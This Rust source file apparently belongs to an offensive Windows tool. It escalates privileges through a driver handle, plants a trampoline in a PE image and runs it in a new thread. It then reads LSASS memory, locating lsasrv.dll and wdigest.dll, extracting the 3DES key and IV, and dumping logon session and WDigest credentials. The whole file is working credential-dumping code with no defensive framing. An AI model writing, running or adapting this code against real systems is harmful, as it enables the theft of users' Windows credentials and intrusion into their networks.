use std::ffi::c_void;
use std::sync::atomic::{AtomicI32, Ordering};

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject,
    INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
};

use crate::proto::{Handle, make_wbcc};
use crate::session::{escalate, open_proc, new_session, find_remote_module};
use crate::wbmf::{install_trampoline, set_page_rx};
use axhunter_lsa::{lsa, logon, wdigest, pe, sys};

pub static DUMP_STATUS: AtomicI32 = AtomicI32::new(i32::MIN);

#[repr(C)]
pub struct DumpArgs { pub dev: Handle, pub pe_base: u64, pub our_pid: u32, pub target_pid: u32 }
unsafe impl Send for DumpArgs {}
unsafe impl Sync for DumpArgs {}
pub static mut G_DUMP: DumpArgs = DumpArgs { dev: 0, pe_base: 0, our_pid: 0, target_pid: 0 };

unsafe extern "system" fn dump_worker(_: *mut c_void) -> u32 {
    let a    = &G_DUMP;
    let wbcc = make_wbcc(a.pe_base);

    if !escalate(a.dev, &wbcc, a.our_pid) {
        DUMP_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }

    let proc_handle = match open_proc(a.dev, &wbcc, a.target_pid) {
        Ok(h)  => h,
        Err(e) => { DUMP_STATUS.store(e, Ordering::SeqCst); return 1; }
    };

    let session = new_session(a.dev, a.pe_base, proc_handle);
    let result  = do_dump(&session, proc_handle as Handle);

    use crate::proto::Handle as H;
    unsafe extern "system" { fn NtClose(h: H) -> i32; }
    let _ = unsafe { NtClose(proc_handle as H) };

    match result {
        Ok(())  => { DUMP_STATUS.store(0, Ordering::SeqCst); 0 }
        Err(e)  => { eprintln!("[-] dump: {e}"); DUMP_STATUS.store(-1, Ordering::SeqCst); 1 }
    }
}

fn do_dump(session: &crate::session::Xh2Session, proc_handle: Handle) -> Result<(), String> {
    let build = sys::build_number()?;
    println!("[+] OS build  {build}");

    lsa::ensure_lsasrv_loaded()?;
    let lsasrv_local  = lsa::local_lsasrv_base()?;
    let lsasrv_remote = find_remote_module(session, proc_handle, "lsasrv.dll")?;
    println!("[+] lsasrv.dll  local={lsasrv_local:#x}  remote={lsasrv_remote:#x}");

    let key_addrs = lsa::locate_key_addresses(build)?;
    let keys      = lsa::fetch_keys(session, &key_addrs, lsasrv_local, lsasrv_remote)?;

    print!("[+] 3DES key ({:>2}B)  ", keys.des3_len);
    for b in &keys.des3_key { print!("{b:02x}"); }
    println!();
    print!("[+] IV              ");
    for b in &keys.iv { print!("{b:02x}"); }
    println!();

    println!("\n===== LogonSessionList =====");
    match logon::locate_list_head_local(build) {
        Ok(local_head) => {
            let remote_head = lsasrv_remote + (local_head - lsasrv_local);
            logon::dump(session, remote_head, &keys, build);
        }
        Err(e) => eprintln!("[!] LogonSessionList skipped: {e}"),
    }

    println!("\n===== WDigest =====");
    match wdigest::locate_list_head_local() {
        Ok(local_head) => {
            let wdigest_local  = pe::local_base("wdigest.dll")?;
            let wdigest_remote = find_remote_module(session, proc_handle, "wdigest.dll")?;
            let remote_head    = wdigest::locate_list_head_remote(
                wdigest_local, wdigest_remote, local_head);
            wdigest::dump(session, remote_head, &keys);
        }
        Err(e) => eprintln!("[!] WDigest skipped: {e}"),
    }

    println!("\n[*] Done.");
    Ok(())
}

pub fn run_dump(dev: Handle, pe_ptr: *mut u8, soi: usize, our_pid: u32, target_pid: u32) -> i32 {
    let pe_base = pe_ptr as u64;
    unsafe { G_DUMP = DumpArgs { dev, pe_base, our_pid, target_pid }; }
    install_trampoline(pe_ptr, 0x540, dump_worker as u64);
    println!("[+] trampoline  {:#x} -> dump_worker", pe_base + 0x540);
    unsafe { set_page_rx(pe_ptr, soi); }

    let entry: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        unsafe { std::mem::transmute((pe_base + 0x540) as usize) };
    let th = unsafe {
        CreateThread(None, 0, entry, None, THREAD_CREATE_RUN_IMMEDIATELY, None)
            .expect("CreateThread(dump_worker)")
    };
    unsafe { WaitForSingleObject(th, INFINITE); let _ = CloseHandle(th); }
    DUMP_STATUS.load(Ordering::SeqCst)
}
